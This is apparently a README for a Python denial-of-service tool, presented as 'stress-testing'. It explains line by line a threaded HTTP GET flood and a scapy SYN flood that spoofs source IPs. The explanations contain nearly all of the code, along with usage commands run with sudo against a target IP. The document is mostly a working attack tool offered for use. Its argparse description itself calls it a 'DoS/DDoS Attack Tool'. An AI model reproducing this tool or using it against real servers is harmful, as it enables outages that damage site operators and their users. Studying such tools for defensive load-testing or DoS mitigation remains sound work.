# dos_tool
Stress-testing python tool

Overview

This Python script implements a simple Denial of Service (DoS) attack tool that supports two types of attacks: HTTP Flood and SYN Flood. The tool is designed to simulate network stress testing by sending multiple HTTP requests or TCP SYN packets to a target server. It uses the socket, threading, time, argparse, scapy, and random libraries to perform these tasks.

import socket: 
This imports Python's built-in socket module, which allows creating network connections (like TCP sockets) to send data over the internet. It's used for establishing connections in the HTTP flood.

import threading: 
Imports the threading module for creating multiple threads (parallel execution paths). This enables sending many requests simultaneously in the HTTP flood, simulating a "flood."

import time: 
Provides functions for handling time, like measuring durations or adding delays (e.g., time.time() for current timestamp, time.sleep() for pauses).

import argparse: 
Imports the argparse module to parse command-line arguments, making the script configurable via flags (e.g., specifying target, port).

from scapy.all import IP, TCP, send: Imports specific classes and functions from the scapy library (a third-party packet manipulation tool). IP and TCP are for crafting IP and TCP packets, and send is for transmitting them. Used only in the SYN flood.

import random: 
Provides functions for generating random numbers, used to spoof source IP addresses in the SYN flood.

Class: HTTPFlood
This class handles an HTTP flood attack, which overwhelms a web server by sending many HTTP GET requests rapidly. It simulates traffic from multiple sources using threads.
__init__(self, target, port, urls_file, duration, intensity)

Purpose: Constructor method that initializes the object with attack parameters.
Inputs:

target: A string representing the target's IP address or domain name (e.g., "example.com").
port: An integer for the target's port (typically 80 for HTTP or 443 for HTTPS).
urls_file: A string path to a file containing URLs to request (e.g., "urls.txt").
duration: An integer for how long the attack should run in seconds.
intensity: An integer for how many requests to send per second.


Outputs: None (initializes instance variables).
How it works:

self.target = target: Stores the target.
self.port = port: Stores the port.
self.urls = self.read_urls(urls_file): Calls the read_urls method to load URLs from the file and stores them in a list.
self.duration = duration: Stores the duration.
self.intensity = intensity: Stores the intensity.



read_urls(self, filename)

Purpose: Reads a file and returns a list of stripped URLs (ignoring empty lines).
Inputs:

filename: A string path to the file (e.g., "urls.txt").


Outputs: A list of strings (URLs), or an empty list if the file isn't found.
How it works:

try:: Starts a try-except block to handle errors.
with open(filename, 'r') as f:: Opens the file in read mode ('r') using a context manager (automatically closes the file).
return [line.strip() for line in f if line.strip()]: Uses a list comprehension to read each line, strip whitespace (e.g., remove newlines), and include only non-empty lines.
except FileNotFoundError:: Catches if the file doesn't exist.
print(f"File {filename} not found."): Prints an error message.
return []: Returns an empty list.



send_request(self, url)

Purpose: Sends a single HTTP GET request to the target using the provided URL.
Inputs:

url: A string URL path (e.g., "/index.html").


Outputs: None (prints success or error).
How it works:

try:: Starts a try-except for error handling.
http_request = f"GET {url} HTTP/1.1\r\nHost: {self.target}\r\n\r\n": Constructs a basic HTTP request string using f-string formatting. \r\n are carriage return and newline for HTTP protocol. This requests the URL from the host.
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:: Creates a TCP socket (AF_INET for IPv4, SOCK_STREAM for TCP) in a context manager.
s.settimeout(10): Sets a 10-second timeout for the socket to prevent hanging.
s.connect((self.target, self.port)): Connects to the target IP/domain and port.
s.send(http_request.encode()): Encodes the request to bytes and sends it.
print(f"Request sent to {url}"): Prints success.
except Exception as e:: Catches any errors (e.g., connection failure).
print(f"Error sending request: {e}"): Prints the error.



start_attack(self)

Purpose: Launches the flood by creating threads to send requests repeatedly for the duration.
Inputs: None (uses instance variables).
Outputs: None (prints start/completion and manages threads).
How it works:

print("Starting HTTP flood attack..."): Announces start.
threads = []: Initializes an empty list to track threads.
start_time = time.time(): Records current time.
while time.time() - start_time < self.duration:: Loops until duration expires.

for _ in range(self.intensity):: Loops to create 'intensity' number of threads per second.

thread = threading.Thread(target=self.send_request, args=(self.urls[0],)): Creates a thread targeting send_request with the first URL (note: it always uses self.urls[0], ignoring others).
thread.start(): Starts the thread.
threads.append(thread): Adds to list.


time.sleep(1): Pauses 1 second between bursts.


for thread in threads:: After loop.

thread.join(): Waits for each thread to finish.


print("HTTP flood attack completed."): Announces end.



Class: SynFlood
This class handles a SYN flood attack, which exploits TCP handshakes by sending many SYN packets without completing them, exhausting server resources.
__init__(self, target, port, duration, pps)

Purpose: Initializes with attack parameters.
Inputs:

target: String IP/domain.
port: Integer port.
duration: Integer seconds.
pps: Integer packets per second (uses 'intensity' from args as pps).


Outputs: None.
How it works: Similar to HTTPFlood.__init__, stores values in self.target, etc.

start_attack(self)

Purpose: Sends SYN packets at the specified rate for the duration.
Inputs: None.
Outputs: None (prints packets sent and completion).
How it works:

print("Starting SYN flood attack..."): Announces start.
start_time = time.time(): Records time.
while time.time() - start_time < self.duration:: Loops for duration.

src_ip = f"192.168.1.{random.randint(1, 255)}": Generates a fake source IP (spoofing, always 192.168.1.x range).
packet = IP(src=src_ip, dst=self.target) / TCP(dport=self.port, flags="S"): Crafts a packet using Scapy: IP layer with source/destination, layered with TCP (destination port, SYN flag 'S' for handshake start).
send(packet, verbose=0): Sends the packet silently (verbose=0 suppresses output).
time.sleep(1/self.pps): Pauses to achieve packets-per-second rate (e.g., for 100 pps, sleep 0.01 seconds).
print(f"SYN packet sent from {src_ip} to {self.target}:{self.port}"): Logs each send.


print("SYN flood attack completed."): Announces end.



Function: main()

Purpose: Entry point for parsing args and starting the attack.
Inputs: None (reads from command line).
Outputs: None (launches attack or prints errors).
How it works:

parser = argparse.ArgumentParser(description='DoS/DDoS Attack Tool'): Creates parser with description.
parser.add_argument('attack_type', choices=['http', 'syn'], help='Type of attack (http or syn)'): Positional arg for type, restricted to choices.
parser.add_argument('-t', '--target', required=True, help='Target IP or domain'): Required flag for target.
parser.add_argument('-p', '--port', type=int, required=True, help='Target port'): Required int for port.
parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds'): Optional int, default 60.
parser.add_argument('-i', '--intensity', type=int, default=100, help='Intensity of attack (requests/threads per second)'): Optional int, default 100.
parser.add_argument('-u', '--urls', type=str, help='File containing URLs for HTTP flood'): Optional for HTTP URLs file.
args = parser.parse_args(): Parses command line into args object.
if args.attack_type == 'http':: Checks type.

if not args.urls:: Requires URLs file for HTTP.

print("For HTTP flood, please provide a URLs file."): Error if missing.
return: Exits function.


http_flood = HTTPFlood(args.target, args.port, args.urls, args.duration, args.intensity): Creates instance.
http_flood.start_attack(): Starts it.


elif args.attack_type == 'syn':: For SYN.

syn_flood = SynFlood(args.target, args.port, args.duration, args.intensity): Creates instance (uses intensity as pps).
syn_flood.start_attack(): Starts it.





 if __name__ == "__main__":

main(): Runs main() only if the script is executed directly (not imported as a module).


Usage:
HTTP Flood:

bash
sudo python dos_tool.py http -t 192.168.47.135 -p 80 -u urls.txt -d 30 -i 50
-t 192.168.47.135: Target IP or domain.

-p 80: Target port.

-u urls.txt: File containing URLs to flood.

-d 30: Attack duration in seconds.

-i 50: Number of concurrent requests per second.

SYN Flood:

bash
sudo python dos_tool.py syn -t 192.168.47.135 -p 80 -d 30 -i 100
-t 192.168.47.135: Target IP.

-p 80: Target port.

-d 30: Attack duration in seconds.

-i 100: Packets per second.
